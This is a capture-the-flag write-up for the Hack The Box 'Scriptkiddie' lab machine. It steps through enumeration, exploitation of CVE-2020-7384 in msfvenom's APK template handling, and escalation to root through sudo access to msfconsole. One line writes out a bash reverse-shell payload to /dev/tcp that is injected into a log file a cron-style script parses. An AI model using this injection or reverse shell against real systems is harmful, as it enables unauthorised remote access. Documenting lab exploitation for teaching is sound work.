---
title: "Scriptkiddie HTB Writeup"
date: 2021-06-05T03:20:36+02:00
draft: false
Tags: [
    "Writeups",
    "hackthebox",
    "retired",
    "easy",
    "linux",
]
---
![Machine Info](/images/sk/1.png)

### 1. Enumeration:
* Nmap:
To scan for open ports and services running
 * ``$ nmap -sC -sV 10.10.10.226 ``
![](/images/sk/2.png)

So we got ssh on (port 22) and a Werkzeug httpd server on (port 5000)

### 2. Web Enumeration:
* Got this interesting page ... 
![](/images/sk/3.png)

* It makes some functions like searchsploit or making nmap scan on IPs, also making metasploit payloads! 

![](/images/sk/4.png)
![](/images/sk/5.png)

#### The interesting part When generating any windows or linux payload, we discover a ``/static/payloads/name.exe`` of generated payloads where we can download from:

![](/images/sk/7.png)
![](/images/sk/6.png)

We also can provide a template for given payload type we are going to generate:

![](/images/sk/8.png)

It includes APK templates allowed and after some googling, found out exploit module for APK templates which uses command injection:
* [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/)
![](/images/sk/9.png)

  * module options:
![](/images/sk/10.png)

so let's generate an apk file and use it as our template:

* ``use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection``
![](/images/sk/11.png)
* copy the file to your working directory .. ``cp /home/'username'/.msf4/local/msf.apk .``
![](/images/sk/12.png)

* let's make payload with the site:
  * choose android, your lhost ip (tun0) and the template we made (the malicious apk)
![](/images/sk/13.png)

* open netcat listner on the port we choose earlier in the apk (4444) - do this step before generating the payload 
  * ``$ nc -lvnp 4444``  
![](/images/sk/14.png)
And here we got shell as user kid and his flag ...

* note: once you hit generate you will get the shell on your nc listener

### 3. Privilege Escalation:
* Rooting:
  * let's discover files ... 
  * interesting script with lots of permissions ... 
![](/images/sk/15.png)

* let's view it ``cat scanlosers.sh``
![](/images/sk/16.png)

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
*  -d' ' single space used as field separator and -f3- means the ip starts from the 3rd field

#### It's a bash script doing some nmap scan over the logged IPs from the ``/home/kid/logs/hackers`` file.. if we could inject our reverse shell payload in the file and commenting the rest of the file to scape the parsing process; it will be executed by scanlosers.sh and we will get a root shell.. 

* our payload:

``echo "A A  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.17.34/9001 0>&1' #" >> hackers``
* '#' >> for commenting the rest of nmap command and escaping the redirection to /dev/null output ...
![](/images/sk/18.png)

* ``nc -lvnp 9001``
![](/images/sk/19.png)

And we got shell as user ``pwn``.. not root yet! 
  * trying ``sudo -l`` worked without pass
![](/images/sk/20.png)

  * ``(root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole``  >> means we can run metasploit as root 
* ``sudo  /opt/metasploit-framework-6.0.9/msfconsole``

![](/images/sk/21.png)
* here we can go to the root directory and view the root.txt flag:
  * ``/root/root.txt``
![](/images/sk/22.png)
![](/images/sk/23.png)

And we got the root flag ... 

### References:
* [CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384)
* [APK template command injection](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md)

=======================

Hope you enjoyed the writeup ..

If so kindly give me respect [Wh1rlw1nd-HTB](https://www.hackthebox.eu/home/users/profile/182588) ...
